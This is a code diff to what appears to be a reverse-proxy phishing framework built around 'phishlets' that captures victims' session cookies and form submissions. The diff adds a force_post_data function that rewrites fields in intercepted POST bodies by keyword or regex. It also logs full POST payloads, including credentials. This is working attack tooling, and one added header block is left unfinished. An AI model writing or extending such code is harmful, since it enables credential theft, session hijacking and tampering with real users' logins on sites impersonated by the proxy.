@@ -780,6 +780,121 @@ async def update_session_data(session_cookie: str, phishlet_id: int, proxy_domai
     except Exception as e:
         debug_log(f"Error updating session data: {e}", "ERROR")
 
+def get_request_encoding(request):
+    """
+    Returns the encoding type of the request body based on Content-Type header.
+    """
+    content_type = request.headers.get('Content-Type', '').lower()
+    if 'application/x-www-form-urlencoded' in content_type:
+        return 'form'
+    elif 'application/json' in content_type:
+        return 'json'
+    elif 'multipart/form-data' in content_type:
+        return 'multipart'
+    else:
+        return 'unknown'
+# 
+async def force_post_data(request, phishlet_id: int):
+    """
+    In outgoing post request if keyword from phishlet force_post is there then do replacement.
+    Handles both form and JSON encoded bodies.
+    """
+    try:
+        if request.method == 'POST':
+            request_path = str(request.rel_url)
+            if phishlet_id:
+                import asyncio
+                import urllib.parse
+                import json
+
+                def _get_phishlet_data():
+                    from .models import Phishlet
+                    try:
+                        phishlet = Phishlet.objects.get(id=phishlet_id)
+                        return phishlet.data if isinstance(phishlet.data, dict) else {}
+                    except Phishlet.DoesNotExist:
+                        return {}
+
+                loop = asyncio.get_running_loop()
+                phishlet_data = await loop.run_in_executor(None, _get_phishlet_data)
+
+                force_post_configs = phishlet_data.get('force_post', [])
+                if not force_post_configs:
+                    return
+
+                request_body = await request.read()
+                encoding = get_request_encoding(request)
+                form_data = {}
+                modified = False
+
+                try:
+                    if encoding == 'form':
+                        form_str = request_body.decode('utf-8')
+                        form_data = dict(urllib.parse.parse_qsl(form_str))
+                    elif encoding == 'json':
+                        form_data = json.loads(request_body.decode('utf-8'))
+                    else:
+                        debug_log(f"Unsupported encoding for force_post: {encoding}", "DEBUG")
+                        return
+                    debug_log(f"Form data parsed for force_post: {form_data}", "DEBUG")
+                except Exception as e:
+                    debug_log(f"Could not parse request body for force_post: {e}", "DEBUG")
+                    return
+
+                for config in force_post_configs:
+                    url = config.get('url', '')
+                    method = config.get('method', 'POST').upper()
+                    keyword = config.get('keyword', '')
+                    use_regex = config.get('regexp', 'false').lower() == 'true'
+                    regex_string = config.get('regexp_string', '')
+                    replace_value = config.get('replace_value', '')
+
+                    if url != request_path:
+                        continue
+
+                    if keyword in form_data:
+                        original_value = form_data[keyword]
+                        form_data[keyword] = replace_value
+                        modified = True
+                        debug_log(f"Force replaced keyword '{keyword}' value from '{original_value}' to '{replace_value}'", "INFO")
+
+                    elif use_regex and regex_string:
+                        try:
+                            import re
+                            if encoding == 'form':
+                                form_str = urllib.parse.urlencode(form_data)
+                                new_form_str, count = re.subn(regex_string, replace_value, form_str)
+                                if count > 0:
+                                    form_data = dict(urllib.parse.parse_qsl(new_form_str))
+                                    modified = True
+                                    debug_log(f"Force replaced using regex '{regex_string}' to '{replace_value}'", "INFO")
+                            elif encoding == 'json':
+                                json_str = json.dumps(form_data)
+                                new_json_str, count = re.subn(regex_string, replace_value, json_str)
+                                if count > 0:
+                                    form_data = json.loads(new_json_str)
+                                    modified = True
+                                    debug_log(f"Force replaced using regex '{regex_string}' to '{replace_value}' in JSON", "INFO")
+                        except Exception as e:
+                            debug_log(f"Regex error in force_post: {e}", "ERROR")
+                    else:
+                        debug_log(f"Keyword '{keyword}' not found in form data for force_post", "DEBUG")
+
+                # saving new form data
+                if modified:
+                    if encoding == 'form':
+                        new_body = urllib.parse.urlencode(form_data).encode('utf-8')
+                    elif encoding == 'json':
+                        new_body = json.dumps(form_data).encode('utf-8')
+                    else:
+                        debug_log(f"Cannot force replace POST data: unsupported Content-Type '{request.headers.get('Content-Type', '')}'", "WARN")
+                        return
+                    request['_body'] = new_body
+                    debug_log(f"Force post data modified for request to {request_path}", "INFO")
+
+    except Exception as e:
+        debug_log(f"Error in force_post_data: {e}", "ERROR")
+# 
 async def capture_form_data(request, session_cookie: str, phishlet_id: int, proxy_domain: str):
     """
     Capture form data from POST requests and update session based on phishlet credential configuration
@@ -2188,7 +2303,36 @@ async def proxy_handler(request):
                     
                     # Capture form data if this is a POST request
                     await capture_form_data(request, session_cookie, matching_phishlet['id'], matching_phishlet['proxy_domain'])
-                    
+                    await force_post_data(request, matching_phishlet['id'])
+                    # if request is post print body
+                    # ...existing code...
+                    if request.method == 'POST':
+                        try:
+                            request_data = request.get('_body') if request.get('_body') else await request.read()
+                            content_type = request.headers.get('Content-Type', '').lower()
+                            import urllib.parse, json
+                            if 'application/x-www-form-urlencoded' in content_type:
+                                parsed = dict(urllib.parse.parse_qsl(request_data.decode('utf-8')))
+                            elif 'application/json' in content_type:
+                                parsed = json.loads(request_data.decode('utf-8'))
+                            else:
+                                parsed = request_data.decode('utf-8', errors='replace')
+                            debug_log(f"XXX POST data: {parsed}", "DEBUG")
+                        except Exception as e:
+                            debug_log(f"Error reading POST data: {e}", "ERROR")
+                    # ...existing code...
+                    # check contet lent and update hader acordingly
+                    content_length = request.headers.get('Content-Length')
+                    if content_length:
+                        try:
+                            content_length_int = int(content_length)
+                            if content_length_int > 0:
+                                forward_headers = dict(request.headers)
+                                forward_headers['Content-Length'] = str(content_length_int)
+                                debug_log(f"Updated Content-Length header to {content_length_int}", "DEBUG")
+                                # Use forward_headers when sending the request upstream
+                        except ValueError:
+                            debug_log(f"Invalid Content-Length header value: {content_length}", "WARN")
                     # Store session info for later use in response
                     request['session_cookie'] = session_cookie
                     request['phishlet_id'] = matching_phishlet['id']
